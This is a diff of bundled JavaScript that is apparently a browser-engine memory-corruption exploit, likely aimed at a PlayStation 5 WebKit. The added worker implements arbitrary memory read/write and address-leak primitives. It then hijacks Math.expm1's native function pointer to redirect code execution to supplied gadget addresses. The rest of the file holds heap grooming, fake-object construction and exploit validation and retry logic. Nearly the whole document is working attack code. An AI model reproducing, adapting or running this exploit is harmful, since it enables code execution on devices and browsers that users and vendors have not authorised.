@@ -1,4 +1,8 @@
 (() => {
+  // js/rpc_worker.js
+  var rpc_worker_default =
+    '"use strict";\n\nlet marker_arr = new Uint32Array(new ArrayBuffer(0x10));\n\nconst transfer = [];\n\nlet leakObj = null;\nlet master = null;\nlet victim = null;\n\nlet leakLo = 0, leakHi = 0;\nlet wired = false;\n\nlet pivotObj = null;\nlet execLo = 0, execHi = 0;\nlet origLo = 0, origHi = 0;\nlet armed = false;\n\nconst VECTOR_OFF = 0x10;\nconst INLINE_OFF = 0x10;\nconst M_FUNCTION = 0x28;\nconst EXECUTABLE = 0x18;\n\nfunction view(lo, hi) {\n    if (!wired) throw new Error("worker arw is not wired yet");\n    master[VECTOR_OFF / 4] = lo >>> 0;\n    master[VECTOR_OFF / 4 + 1] = hi >>> 0;\n    return victim;\n}\n\nfunction at(a, n) {\n    const l = (a[0] >>> 0) + n;\n    return l > 0xffffffff\n        ? [(l - 0x100000000) >>> 0, (a[1] + 1) >>> 0]\n        : [l >>> 0, a[1] >>> 0];\n}\nfunction rd8(lo, hi) {\n    const dv = view(lo, hi);\n    return [dv.getUint32(0, true), dv.getUint32(4, true)];\n}\nfunction wr8(lo, hi, vlo, vhi) {\n    const dv = view(lo, hi);\n    dv.setUint32(0, vlo >>> 0, true);\n    dv.setUint32(4, vhi >>> 0, true);\n}\nfunction addrofRaw(obj) {\n    leakObj.obj = obj;\n    const dv = view(leakLo, leakHi);\n    const a = [dv.getUint32(INLINE_OFF, true), dv.getUint32(INLINE_OFF + 4, true)];\n    leakObj.obj = null;\n    return a;\n}\n\nconst api = {\n    ping() {\n        return "pong";\n    },\n\n    init(sentLo, sentHi) {\n        leakObj = { obj: null };\n        master = new Uint32Array(6);\n        victim = new DataView(new ArrayBuffer(0x30));\n\n        marker_arr[0] = sentLo >>> 0;\n        marker_arr[1] = sentHi >>> 0;\n        marker_arr[2] = 0x5a5a5a5a;\n        marker_arr[3] = 0xa5a5a5a5;\n\n        marker_arr.leak = leakObj;\n        marker_arr.master = master;\n        marker_arr.victim = victim;\n\n        transfer.push(marker_arr.buffer);\n        return marker_arr;\n    },\n\n    setup(lo, hi) {\n        pivotObj = {};\n        leakLo = lo >>> 0;\n        leakHi = hi >>> 0;\n        wired = true;\n\n        const dv = view(leakLo, leakHi);\n        const h0 = dv.getUint32(0, true), h1 = dv.getUint32(4, true);\n        if (h0 === 0 && h1 === 0) {\n            wired = false;\n            throw new Error("leak cell header reads zero -- the wire did not take");\n        }\n        return [h0, h1];\n    },\n\n    readU32(lo, hi, count) {\n        if (count < 1 || count * 4 > 0x30) throw new Error("count out of range");\n        const dv = view(lo, hi);\n        const out = [];\n        for (let i = 0; i < count; ++i) out.push(dv.getUint32(i * 4, true));\n        return out;\n    },\n\n    writeU32(lo, hi, values) {\n        if (values.length * 4 > 0x30) throw new Error("too many values");\n        const dv = view(lo, hi);\n        for (let i = 0; i < values.length; ++i)\n            dv.setUint32(i * 4, values[i] >>> 0, true);\n        return values.length;\n    },\n\n    addrof(which) {\n        return addrofRaw(which === "master" ? master\n            : which === "victim" ? victim\n            : which === "leak" ? leakObj\n            : which === "pivot" ? pivotObj\n            : which === "expm1" ? Math.expm1\n            : marker_arr);\n    },\n\n    armPivot(g0lo, g0hi) {\n        if (armed) throw new Error("already armed");\n        const fn = addrofRaw(Math.expm1);\n        const exAt = at(fn, EXECUTABLE);\n        const ex = rd8(exAt[0], exAt[1]);\n        if (ex[0] === 0 && ex[1] === 0)\n            throw new Error("expm1 executable pointer reads zero");\n        execLo = ex[0]; execHi = ex[1];\n\n        const mf = at([execLo, execHi], M_FUNCTION);\n        const orig = rd8(mf[0], mf[1]);\n        if (orig[0] === 0 && orig[1] === 0)\n            throw new Error("expm1 m_function reads zero");\n        origLo = orig[0]; origHi = orig[1];\n\n        wr8(mf[0], mf[1], g0lo, g0hi);\n        const back = rd8(mf[0], mf[1]);\n        if ((back[0] >>> 0) !== (g0lo >>> 0) || (back[1] >>> 0) !== (g0hi >>> 0)) {\n            wr8(mf[0], mf[1], origLo, origHi);\n            throw new Error("m_function did not take the write");\n        }\n        armed = true;\n        return { exec: [execLo, execHi], orig: [origLo, origHi] };\n    },\n\n    fireN(sLo, sHi, n) {\n        if (!armed) throw new Error("pivot is not armed");\n        const pa = addrofRaw(pivotObj);\n        const saved = rd8(pa[0], pa[1]);\n        let fired = 0;\n        for (let i = 0; i < n; ++i) {\n            wr8(pa[0], pa[1], sLo, sHi);\n            Math.expm1(pivotObj);\n            fired++;\n        }\n        wr8(pa[0], pa[1], saved[0], saved[1]);\n        return fired;\n    },\n\n    fireAB(aLo, aHi, bLo, bHi, n) {\n        if (!armed) throw new Error("pivot is not armed");\n        const pa = addrofRaw(pivotObj);\n        const saved = rd8(pa[0], pa[1]);\n        let fired = 0;\n        for (let i = 0; i < n; ++i) {\n            wr8(pa[0], pa[1], aLo, aHi);\n            Math.expm1(pivotObj);\n            wr8(pa[0], pa[1], bLo, bHi);\n            Math.expm1(pivotObj);\n            fired += 2;\n        }\n        wr8(pa[0], pa[1], saved[0], saved[1]);\n        return fired;\n    },\n\n    fire(sLo, sHi) {\n        if (!armed) throw new Error("pivot is not armed");\n        const pa = addrofRaw(pivotObj);\n        const saved = rd8(pa[0], pa[1]);\n        wr8(pa[0], pa[1], sLo, sHi);\n        Math.expm1(pivotObj);\n        wr8(pa[0], pa[1], saved[0], saved[1]);\n        return true;\n    },\n\n    disarm() {\n        if (!armed) return { restored: false, expm1: null };\n        const mf = at([execLo, execHi], M_FUNCTION);\n        wr8(mf[0], mf[1], origLo, origHi);\n        const back = rd8(mf[0], mf[1]);\n        armed = false;\n        const ok = (back[0] >>> 0) === (origLo >>> 0)\n                && (back[1] >>> 0) === (origHi >>> 0);\n        return { restored: ok, mFunction: back, expm1: Math.expm1(1) };\n    },\n\n    release() {\n        marker_arr = null;\n        return true;\n    },\n\n    spin() {\n\n        const sink = new Uint32Array(4);\n        let x = 1;\n        for (;;) {\n            x = (x * 1103515245 + 12345) >>> 0;\n            sink[x & 3] = x;\n        }\n    },\n};\n\nself.onmessage = function (e) {\n    const d = e.data || {};\n    const id = d.id, name = d.name, args = d.args || [];\n    let out;\n    try {\n        const fn = api[name];\n        if (typeof fn !== "function") throw new Error("unknown function " + name);\n        out = { id: id, type: "ret", value: fn.apply(api, args) };\n    } catch (err) {\n        out = { id: id, type: "err", value: (err && err.message) ? err.message : String(err) };\n    }\n    if (transfer.length) {\n        self.postMessage(out, transfer);\n        transfer.length = 0;\n    } else {\n        self.postMessage(out);\n    }\n};\n';
+
   // js/core.js?v=10
   var DRAIN_COUNT = 512;
   var AUTO_RETRY_DELAY_MS = 50;
@@ -13,20 +17,19 @@
   var FUNCTION_BYTES = 32;
   var NATIVE_EXECUTABLE_BYTES = 56;
   var HOLDER_BYTES = 64;
-  var CARRIER_SLOTS = (function() {
+  var CARRIER_SLOTS = (function () {
     try {
       const q = new URLSearchParams(location.search).get("slots");
       const n = q ? parseInt(q, 10) : 0;
       if (n >= 1e5 && n <= 4e7) return n;
-    } catch (e) {
-    }
+    } catch (e) {}
     return 12e6;
   })();
   var CARRIER_BYTES = CARRIER_SLOTS * 8;
   var CAPTURE_DELAY_MS = 50;
   var COMPOSE_DELAY_MS = 100;
   var symbolToString = Symbol.prototype.toString;
-  var _gOverride = (function() {
+  var _gOverride = (function () {
     const out = {};
     try {
       const q = new URLSearchParams(location.search).getAll("g");
@@ -35,11 +38,11 @@
         const n = v && v.startsWith("0x") ? parseInt(v, 16) : parseInt(v, 10);
         if (k && n > 0) out[k] = n;
       }
-    } catch (e) {
-    }
+    } catch (e) {}
     return out;
   })();
-  var _g = (name, dflt) => typeof _gOverride[name] === "number" ? _gOverride[name] : dflt;
+  var _g = (name, dflt) =>
+    typeof _gOverride[name] === "number" ? _gOverride[name] : dflt;
   if (typeof _gOverride.drain === "number") DRAIN_COUNT = _gOverride.drain;
   var DRAIN_SIZE = _g("drainsz", 65536);
   var SLAB_SIZE = _g("slab", 4194304);
@@ -63,16 +66,7 @@
   var scratchBytes = new Uint8Array(scratchBits);
   var scratchWords = new Uint32Array(scratchBits);
   var scratchDouble = new Float64Array(scratchBits);
-  var identityMagic = new Uint8Array([
-    90,
-    165,
-    195,
-    60,
-    222,
-    173,
-    190,
-    239
-  ]);
+  var identityMagic = new Uint8Array([90, 165, 195, 60, 222, 173, 190, 239]);
   var identityBytes = new Uint8Array(8);
   var attemptNumber = 0;
   var attemptCeiling = 0;
@@ -165,7 +159,7 @@
     vectorOffset: 16,
     inlineSlotOffset: 16,
     butterflyOffset: 8,
-    vectorOffsetMeasured: false
+    vectorOffsetMeasured: false,
   };
   function resetProfile() {
     profile.carrierSID = UNSEEN;
@@ -196,10 +190,22 @@
     return true;
   }
   function uint32At(bytes, offset) {
-    return bytes[offset] + bytes[offset + 1] * 256 + bytes[offset + 2] * 65536 + bytes[offset + 3] * 16777216;
+    return (
+      bytes[offset] +
+      bytes[offset + 1] * 256 +
+      bytes[offset + 2] * 65536 +
+      bytes[offset + 3] * 16777216
+    );
   }
   function low48At(bytes, offset) {
-    return bytes[offset] + bytes[offset + 1] * 256 + bytes[offset + 2] * 65536 + bytes[offset + 3] * 16777216 + bytes[offset + 4] * 4294967296 + bytes[offset + 5] * 1099511627776;
+    return (
+      bytes[offset] +
+      bytes[offset + 1] * 256 +
+      bytes[offset + 2] * 65536 +
+      bytes[offset + 3] * 16777216 +
+      bytes[offset + 4] * 4294967296 +
+      bytes[offset + 5] * 1099511627776
+    );
   }
   function readBytes(destination, source, count) {
     for (let i = 0; i < count; ++i) destination[i] = source[i];
@@ -225,20 +231,34 @@
   }
   function pointerFromWords(words, offset) {
     if (words[offset + 3] !== 0) return NaN;
-    return words[offset] + words[offset + 1] * 65536 + words[offset + 2] * 4294967296;
+    return (
+      words[offset] + words[offset + 1] * 65536 + words[offset + 2] * 4294967296
+    );
   }
   function plausibleCell(value) {
-    return value > 4294967296 && value <= 281474976710655 && value <= 9007199254740991 && Math.floor(value) === value && value % 8 === 0;
+    return (
+      value > 4294967296 &&
+      value <= 281474976710655 &&
+      value <= 9007199254740991 &&
+      Math.floor(value) === value &&
+      value % 8 === 0
+    );
   }
   function plausibleAddress(value) {
-    return value > 4294967296 && value <= 281474976710655 && value <= 9007199254740991 && Math.floor(value) === value;
+    return (
+      value > 4294967296 &&
+      value <= 281474976710655 &&
+      value <= 9007199254740991 &&
+      Math.floor(value) === value
+    );
   }
   function canonicalLow48(bytes, offset) {
     return bytes[offset + 6] === 0 && bytes[offset + 7] === 0;
   }
   function dumpHex(bytes, count) {
     let out = "";
-    for (let i = 0; i < count; ++i) out += bytes[i].toString(16).padStart(2, "0");
+    for (let i = 0; i < count; ++i)
+      out += bytes[i].toString(16).padStart(2, "0");
     return out;
   }
   function encodedHeaderNumber() {
@@ -253,16 +273,21 @@
     if (onEvent === null) return;
     try {
       onEvent(tag, detail === void 0 ? "" : String(detail), attemptNumber);
-    } catch {
-    }
+    } catch {}
   }
   function checkCarrierIdentity(candidate) {
-    if (!plausibleAddress(rwOriginalVector) || rwOriginalVector % 8 !== 0 || IDENT_OFFSET + 8 > RW_BUFFER_SIZE)
+    if (
+      !plausibleAddress(rwOriginalVector) ||
+      rwOriginalVector % 8 !== 0 ||
+      IDENT_OFFSET + 8 > RW_BUFFER_SIZE
+    )
       return 0;
     aimCarrier(candidate, rwOriginalVector + IDENT_OFFSET);
     readBytes(identityBytes, rwView, 8);
     restoreCarrier(candidate);
-    return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 60 ? 1 : -1;
+    return sameBytes(identityBytes, identityMagic, 8) && rwView[0] === 60
+      ? 1
+      : -1;
   }
   function runIdentityProof(candidate) {
     candidateMutationStarted = true;
@@ -281,7 +306,7 @@
     running = false;
     if (reject !== null)
       reject(
-        new Error(`core: gave up after ${attemptNumber} attempts (${reason})`)
+        new Error(`core: gave up after ${attemptNumber} attempts (${reason})`),
       );
   }
   function failed() {
@@ -295,8 +320,7 @@
     setTimeout(() => {
       try {
         history.replaceState(null, "");
-      } catch {
-      }
+      } catch {}
       attemptNumber++;
       startAttempt();
     }, AUTO_RETRY_DELAY_MS);
@@ -327,22 +351,26 @@
     keepAlive = null;
     try {
       history.replaceState(null, "");
-    } catch {
-    }
+    } catch {}
     if (typeof globalThis.gc === "function") {
       try {
         globalThis.gc();
-      } catch {
-      }
+      } catch {}
     }
   }
   function scheduleSafeRetry(reason) {
     if (retryScheduled || stopped) return;
-    const candidateStateSafe = !candidateEverReturned || zeroHeaderMiss && !candidateMutationStarted;
-    if (!retrySafe || !candidateStateSafe || candidateMutationStarted || !attemptPersisted) {
+    const candidateStateSafe =
+      !candidateEverReturned || (zeroHeaderMiss && !candidateMutationStarted);
+    if (
+      !retrySafe ||
+      !candidateStateSafe ||
+      candidateMutationStarted ||
+      !attemptPersisted
+    ) {
       emit(
         "AUTO-RETRY-NOT-SCHEDULED",
-        `reason=${reason}-safe=${retrySafe}-candidate-seen=${candidateEverReturned}-candidate-mutated=${candidateMutationStarted}-candidate-state-safe=${candidateStateSafe}-attempt-persisted=${attemptPersisted}`
+        `reason=${reason}-safe=${retrySafe}-candidate-seen=${candidateEverReturned}-candidate-mutated=${candidateMutationStarted}-candidate-state-safe=${candidateStateSafe}-attempt-persisted=${attemptPersisted}`,
       );
       failed();
       return;
@@ -353,15 +381,25 @@
     }
     retryScheduled = true;
     const nextAttempt = attemptNumber + 1;
-    emit("AUTO-RETRY-SCHEDULED", `reason=${reason}-next-attempt=${nextAttempt}`);
+    emit(
+      "AUTO-RETRY-SCHEDULED",
+      `reason=${reason}-next-attempt=${nextAttempt}`,
+    );
     releaseAttemptAllocations();
     setTimeout(
       () => {
-        const candidateStillSafe = !candidateEverReturned || zeroHeaderMiss && !candidateMutationStarted;
-        if (!retrySafe || !candidateStillSafe || candidateMutationStarted || stopped) {
+        const candidateStillSafe =
+          !candidateEverReturned ||
+          (zeroHeaderMiss && !candidateMutationStarted);
+        if (
+          !retrySafe ||
+          !candidateStillSafe ||
+          candidateMutationStarted ||
+          stopped
+        ) {
           emit(
             "AUTO-RETRY-CANCELLED",
-            `reason=${reason}-retry-safe=${retrySafe}-candidate-safe=${candidateStillSafe}-candidate-mutated=${candidateMutationStarted}`
+            `reason=${reason}-retry-safe=${retrySafe}-candidate-safe=${candidateStillSafe}-candidate-mutated=${candidateMutationStarted}`,
           );
           failed();
           return;
@@ -369,14 +407,14 @@
         attemptNumber = nextAttempt;
         startAttempt();
       },
-      Math.max(AUTO_RETRY_DELAY_MS, 750)
+      Math.max(AUTO_RETRY_DELAY_MS, 750),
     );
   }
   function finishEarlySafeAttempt(tag, extra, reason) {
     retrySafe = true;
     emit(
       tag,
-      `${extra}-retry-safe=true-candidate-seen=false-candidate-mutated=false`
+      `${extra}-retry-safe=true-candidate-seen=false-candidate-mutated=false`,
     );
     scheduleSafeRetry(reason);
   }
@@ -453,12 +491,12 @@
     resetAttemptState();
     try {
       sessionStorage.setItem(attemptKey, String(attemptNumber));
-      attemptPersisted = sessionStorage.getItem(attemptKey) === String(attemptNumber);
-    } catch {
-    }
+      attemptPersisted =
+        sessionStorage.getItem(attemptKey) === String(attemptNumber);
+    } catch {}
     emit(
       "ATTEMPT-START",
-      `attempt-persisted=${attemptPersisted}-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`
+      `attempt-persisted=${attemptPersisted}-capture-ms=${CAPTURE_DELAY_MS}-compose-ms=${COMPOSE_DELAY_MS}`,
     );
     try {
       buildAndStoreGraph();
@@ -468,7 +506,7 @@
       finishEarlySafeAttempt(
         "SETUP-THREW",
         `${error?.name}:${String(error?.message).slice(0, 80)}`,
-        "setup-threw"
+        "setup-threw",
       );
     }
   }
@@ -481,13 +519,13 @@
     Leaker.prototype.__proto__ = new Proxy(
       {},
       {
-        get: function(target, property, receiver) {
+        get: function (target, property, receiver) {
           return receiver;
-        }
-      }
+        },
+      },
     );
     const leak = Leaker.prototype.leak;
-    return (function() {
+    return (function () {
       return leak();
     })();
   }
@@ -515,12 +553,19 @@
       q2: rwView,
       q3: lengthWord,
       q4: 2.2,
-      q5: 3.3
+      q5: 3.3,
     };
     delete fakeHost.q1;
     delete fakeHost.q4;
     delete fakeHost.q5;
-    if (!Number.isFinite(fakeHost.q0) || fakeHost.q2 !== rwView || fakeHost.q3 !== lengthWord || rwView[0] !== 60 || targetView[0] !== 165 || typeof nativeTarget !== "function")
+    if (
+      !Number.isFinite(fakeHost.q0) ||
+      fakeHost.q2 !== rwView ||
+      fakeHost.q3 !== lengthWord ||
+      rwView[0] !== 60 ||
+      targetView[0] !== 165 ||
+      typeof nativeTarget !== "function"
+    )
       throw new Error("fake-host-shape-failed");
     anchorElement = document.createElement("textarea");
     markerObjectA = { marker: 1296126539, kind: "probe-marker-a" };
@@ -533,9 +578,20 @@
       q2: markerObjectA,
       q3: markerObjectB,
       q4: holderGuardA,
-      q5: holderGuardB
+      q5: holderGuardB,
     };
-    if (targetHolder.q0 !== nativeTarget || targetHolder.q1 !== anchorElement || targetHolder.q2 !== markerObjectA || targetHolder.q3 !== markerObjectB || targetHolder.q4 !== holderGuardA || targetHolder.q5 !== holderGuardB || anchorElement === null || typeof anchorElement !== "object" || markerObjectA.marker !== 1296126539 || markerObjectB.marker !== 1296126540)
+    if (
+      targetHolder.q0 !== nativeTarget ||
+      targetHolder.q1 !== anchorElement ||
+      targetHolder.q2 !== markerObjectA ||
+      targetHolder.q3 !== markerObjectB ||
+      targetHolder.q4 !== holderGuardA ||
+      targetHolder.q5 !== holderGuardB ||
+      anchorElement === null ||
+      typeof anchorElement !== "object" ||
+      markerObjectA.marker !== 1296126539 ||
+      markerObjectB.marker !== 1296126540
+    )
       throw new Error("probe-holder-shape-failed");
   }
   function buildAndStoreGraph() {
@@ -590,7 +646,15 @@
   function fillRawCellPointers(backing, pointer) {
     pointerHigh = Math.floor(pointer / 4294967296);
     pointerLow = pointer - pointerHigh * 4294967296;
-    if (!plausibleCell(pointer) || pointerHigh < 0 || pointerHigh > 65535 || Math.floor(pointerLow) !== pointerLow || pointerLow < 0 || pointerLow > 4294967295 || pointerLow + pointerHigh * 4294967296 !== pointer)
+    if (
+      !plausibleCell(pointer) ||
+      pointerHigh < 0 ||
+      pointerHigh > 65535 ||
+      Math.floor(pointerLow) !== pointerLow ||
+      pointerLow < 0 ||
+      pointerLow > 4294967295 ||
+      pointerLow + pointerHigh * 4294967296 !== pointer
+    )
       throw new Error("invalid-low48-fake-address");
     predecessorWords = new Uint32Array(backing);
     for (let i = 0; i < predecessorWords.length; i += 2) {
@@ -598,7 +662,12 @@
       predecessorWords[i + 1] = pointerHigh;
     }
     const last = predecessorWords.length - 2;
-    if (predecessorWords[0] !== pointerLow || predecessorWords[1] !== pointerHigh || predecessorWords[last] !== pointerLow || predecessorWords[last + 1] !== pointerHigh)
+    if (
+      predecessorWords[0] !== pointerLow ||
+      predecessorWords[1] !== pointerHigh ||
+      predecessorWords[last] !== pointerLow ||
+      predecessorWords[last + 1] !== pointerHigh
+    )
       throw new Error("pointer-fill-verification-failed");
   }
   function clearPredecessor() {
@@ -640,17 +709,36 @@
       const rwLength = uint32At(rwHeader, 24);
       rwOriginalVector = low48At(rwHeader, 16);
       const rwTailByte = rwHeader[32];
-      const rwOffsetZero = allZero(rwHeader, 33, 40) && (rwTailByte === 0 || rwTailByte === 2);
+      const rwOffsetZero =
+        allZero(rwHeader, 33, 40) && (rwTailByte === 0 || rwTailByte === 2);
       profile.carrierSID = rwSID;
       profile.carrierType = rwHeader[5];
       profile.carrierFlags = rwHeader[6];
       profile.carrierMode = rwHeader[28];
       profile.carrierByte28 = rwHeader[40];
       profile.carrierByte20 = rwHeader[32];
-      rwHeaderOK = rwSID >= 256 && rwSID < 134217728 && rwHeader[4] === 0 && (rwHeader[7] === 0 || rwHeader[7] === 1) && rwHeader[14] === 0 && rwHeader[15] === 0 && rwButterfly > 4294967296 && rwButterfly % 8 === 0 && rwHeader[22] === 0 && rwHeader[23] === 0 && rwOriginalVector > 4294967296 && rwOriginalVector % 8 === 0 && rwLength === RW_BUFFER_SIZE && rwHeader[29] === 0 && rwHeader[30] === 0 && rwHeader[31] === 0 && rwOffsetZero;
+      rwHeaderOK =
+        rwSID >= 256 &&
+        rwSID < 134217728 &&
+        rwHeader[4] === 0 &&
+        (rwHeader[7] === 0 || rwHeader[7] === 1) &&
+        rwHeader[14] === 0 &&
+        rwHeader[15] === 0 &&
+        rwButterfly > 4294967296 &&
+        rwButterfly % 8 === 0 &&
+        rwHeader[22] === 0 &&
+        rwHeader[23] === 0 &&
+        rwOriginalVector > 4294967296 &&
+        rwOriginalVector % 8 === 0 &&
+        rwLength === RW_BUFFER_SIZE &&
+        rwHeader[29] === 0 &&
+        rwHeader[30] === 0 &&
+        rwHeader[31] === 0 &&
+        rwOffsetZero;
       if (!rwHeaderOK) {
         zeroHeaderMiss = allZero(rwHeader, 0, CELL_BYTES);
-        retrySafe = zeroHeaderMiss && !rwVectorTouched && !candidateMutationStarted;
+        retrySafe =
+          zeroHeaderMiss && !rwVectorTouched && !candidateMutationStarted;
         candidate = null;
         clearPredecessor();
         compositionState = 3;
@@ -669,11 +757,14 @@
       if (scratchBytes[6] >= 2) {
         scratchBytes[6] -= 2;
       } else {
-        scratchBytes[6] = scratchBytes[6] + 256 - 2 & 255;
-        scratchBytes[7] = scratchBytes[7] - 1 & 255;
+        scratchBytes[6] = (scratchBytes[6] + 256 - 2) & 255;
+        scratchBytes[7] = (scratchBytes[7] - 1) & 255;
       }
       const upgradedHeader = scratchDouble[0];
-      const upgradedFinite = upgradedHeader === upgradedHeader && upgradedHeader !== Infinity && upgradedHeader !== -Infinity;
+      const upgradedFinite =
+        upgradedHeader === upgradedHeader &&
+        upgradedHeader !== Infinity &&
+        upgradedHeader !== -Infinity;
       if (!upgradedFinite) {
         candidate = null;
         clearPredecessor();
@@ -690,7 +781,11 @@
       }
       rwVectorTouched = true;
       aimCarrier(candidate, targetAddress);
-      const holderRepeated = readTwiceMatches(holderHeader, rwView, HOLDER_BYTES);
+      const holderRepeated = readTwiceMatches(
+        holderHeader,
+        rwView,
+        HOLDER_BYTES,
+      );
       const holderSID = uint32At(holderHeader, 0);
       const holderButterflyZero = allZero(holderHeader, 8, 16);
       nativeTargetAddress = low48At(holderHeader, 16);
@@ -702,7 +797,31 @@
       profile.holderSID = holderSID;
       profile.holderType = holderHeader[5];
       profile.holderFlags = holderHeader[6];
-      holderHeaderOK = holderRepeated && holderSID >= 256 && holderSID < 134217728 && targetAddress % 16 === 0 && holderHeader[4] === 0 && (holderHeader[7] === 0 || holderHeader[7] === 1) && holderButterflyZero && plausibleCell(nativeTargetAddress) && plausibleCell(anchorElementAddress) && plausibleCell(markerAAddress) && plausibleCell(markerBAddress) && plausibleCell(holderGuardAAddress) && plausibleCell(holderGuardBAddress) && canonicalLow48(holderHeader, 16) && canonicalLow48(holderHeader, 24) && canonicalLow48(holderHeader, 32) && canonicalLow48(holderHeader, 40) && canonicalLow48(holderHeader, 48) && canonicalLow48(holderHeader, 56) && nativeTargetAddress !== anchorElementAddress && nativeTargetAddress !== markerAAddress && anchorElementAddress !== markerAAddress && markerAAddress !== markerBAddress && holderGuardAAddress !== holderGuardBAddress;
+      holderHeaderOK =
+        holderRepeated &&
+        holderSID >= 256 &&
+        holderSID < 134217728 &&
+        targetAddress % 16 === 0 &&
+        holderHeader[4] === 0 &&
+        (holderHeader[7] === 0 || holderHeader[7] === 1) &&
+        holderButterflyZero &&
+        plausibleCell(nativeTargetAddress) &&
+        plausibleCell(anchorElementAddress) &&
+        plausibleCell(markerAAddress) &&
+        plausibleCell(markerBAddress) &&
+        plausibleCell(holderGuardAAddress) &&
+        plausibleCell(holderGuardBAddress) &&
+        canonicalLow48(holderHeader, 16) &&
+        canonicalLow48(holderHeader, 24) &&
+        canonicalLow48(holderHeader, 32) &&
+        canonicalLow48(holderHeader, 40) &&
+        canonicalLow48(holderHeader, 48) &&
+        canonicalLow48(holderHeader, 56) &&
+        nativeTargetAddress !== anchorElementAddress &&
+        nativeTargetAddress !== markerAAddress &&
+        anchorElementAddress !== markerAAddress &&
+        markerAAddress !== markerBAddress &&
+        holderGuardAAddress !== holderGuardBAddress;
       if (!holderHeaderOK) {
         restoreCarrier(candidate);
         rwVectorTouched = false;
@@ -721,7 +840,28 @@
       profile.functionType = targetHeader[5];
       profile.functionFlags = targetHeader[6];
       const functionType1 = targetHeader[5];
-      functionHeaderOK = functionStructureID >= 256 && functionStructureID < 134217728 && nativeTargetAddress % 16 === 0 && targetHeader[4] === 0 && (targetHeader[7] === 0 || targetHeader[7] === 1) && targetHeader[14] === 0 && targetHeader[15] === 0 && targetHeader[22] === 0 && targetHeader[23] === 0 && targetHeader[30] === 0 && targetHeader[31] === 0 && functionButterfly > 4294967296 && functionButterfly <= 281474976710655 && functionButterfly % 8 === 0 && functionScope > 4294967296 && functionScope <= 281474976710655 && functionScope % 8 === 0 && executableAddress > 4294967296 && executableAddress <= 281474976710655 && executableAddress % 16 === 0 && (executableAddress & 1) === 0;
+      functionHeaderOK =
+        functionStructureID >= 256 &&
+        functionStructureID < 134217728 &&
+        nativeTargetAddress % 16 === 0 &&
+        targetHeader[4] === 0 &&
+        (targetHeader[7] === 0 || targetHeader[7] === 1) &&
+        targetHeader[14] === 0 &&
+        targetHeader[15] === 0 &&
+        targetHeader[22] === 0 &&
+        targetHeader[23] === 0 &&
+        targetHeader[30] === 0 &&
+        targetHeader[31] === 0 &&
+        functionButterfly > 4294967296 &&
+        functionButterfly <= 281474976710655 &&
+        functionButterfly % 8 === 0 &&
+        functionScope > 4294967296 &&
+        functionScope <= 281474976710655 &&
+        functionScope % 8 === 0 &&
+        executableAddress > 4294967296 &&
+        executableAddress <= 281474976710655 &&
+        executableAddress % 16 === 0 &&
+        (executableAddress & 1) === 0;
       if (!functionHeaderOK) {
         restoreCarrier(candidate);
         rwVectorTouched = false;
@@ -740,10 +880,22 @@
       profile.nativeExecFlags = targetHeader[6];
       try {
         globalThis.__ps5NativeCtor = nativeConstructorAddress;
-      } catch (e) {
-      }
+      } catch (e) {}
       const nativeExecType1 = targetHeader[5];
-      nativeExecutableHeaderOK = nativeExecutableStructureID >= 256 && nativeExecutableStructureID < 134217728 && targetHeader[4] === 0 && (targetHeader[7] === 0 || targetHeader[7] === 1) && targetHeader[46] === 0 && targetHeader[47] === 0 && targetHeader[54] === 0 && targetHeader[55] === 0 && plausibleAddress(nativeFunctionAddress) && plausibleAddress(nativeConstructorAddress) && canonicalLow48(targetHeader, 40) && canonicalLow48(targetHeader, 48) && nativeFunctionAddress !== nativeConstructorAddress;
+      nativeExecutableHeaderOK =
+        nativeExecutableStructureID >= 256 &&
+        nativeExecutableStructureID < 134217728 &&
+        targetHeader[4] === 0 &&
+        (targetHeader[7] === 0 || targetHeader[7] === 1) &&
+        targetHeader[46] === 0 &&
+        targetHeader[47] === 0 &&
+        targetHeader[54] === 0 &&
+        targetHeader[55] === 0 &&
+        plausibleAddress(nativeFunctionAddress) &&
+        plausibleAddress(nativeConstructorAddress) &&
+        canonicalLow48(targetHeader, 40) &&
+        canonicalLow48(targetHeader, 48) &&
+        nativeFunctionAddress !== nativeConstructorAddress;
       if (!nativeExecutableHeaderOK) {
         restoreCarrier(candidate);
         rwVectorTouched = false;
@@ -759,44 +911,49 @@
       const nativeFunctionAddress2 = low48At(rwView, 40);
       const nativeConstructorAddress2 = low48At(rwView, 48);
       const nativeExecutableType2 = rwView[5];
-      pointersRepeated = executableAddress2 === executableAddress && nativeFunctionAddress2 === nativeFunctionAddress && nativeConstructorAddress2 === nativeConstructorAddress && functionType2 === functionType1 && nativeExecutableType2 === nativeExecType1;
+      pointersRepeated =
+        executableAddress2 === executableAddress &&
+        nativeFunctionAddress2 === nativeFunctionAddress &&
+        nativeConstructorAddress2 === nativeConstructorAddress &&
+        functionType2 === functionType1 &&
+        nativeExecutableType2 === nativeExecType1;
       restoreCarrier(candidate);
       rwVectorTouched = false;
       targetView[0] = 165;
       rwMirror[0] = 60;
-      restoreObserved = rwView[0] === 60 && rwMirror[0] === 60 && targetView[0] === 165;
+      restoreObserved =
+        rwView[0] === 60 && rwMirror[0] === 60 && targetView[0] === 165;
       liveCandidate = candidate;
       candidate = null;
       clearPredecessor();
       compositionState = 1;
     } catch (error) {
-      retrySafe = candidate === null && result === null && !rwHeaderCaptured && error?.name === "TypeError";
+      retrySafe =
+        candidate === null &&
+        result === null &&
+        !rwHeaderCaptured &&
+        error?.name === "TypeError";
       if (result !== null) {
         try {
           result[DUPLICATE_INDEX] = void 0;
-        } catch {
-        }
+        } catch {}
       }
       if (candidate !== null && rwHeaderCaptured && rwVectorTouched) {
         try {
           restoreCarrier(candidate);
-        } catch {
-        }
+        } catch {}
       }
       candidate = null;
       result = null;
       try {
         targetView[0] = 165;
-      } catch {
-      }
+      } catch {}
       try {
         rwMirror[0] = 60;
-      } catch {
-      }
+      } catch {}
       try {
         clearPredecessor();
-      } catch {
-      }
+      } catch {}
       compositionError = error;
       compositionState = -1;
     }
@@ -825,21 +982,20 @@
       keepAlive[keepIndex++] = predecessor;
       emit(
         "PREDECESSOR-FILLED",
-        `qwords=${PREDECESSOR_SIZE / 8}-fake=${hex(fakeAddress)}`
+        `qwords=${PREDECESSOR_SIZE / 8}-fake=${hex(fakeAddress)}`,
       );
       criticalBarrier(fakeAddress, targetAddress);
       channel.port1.postMessage(0, [
         butterflyHole1,
         butterflyHole2,
         earlyHole,
-        finalHole
+        finalHole,
       ]);
       loadHistoryCritical();
     } catch (error) {
       try {
         clearPredecessor();
-      } catch {
-      }
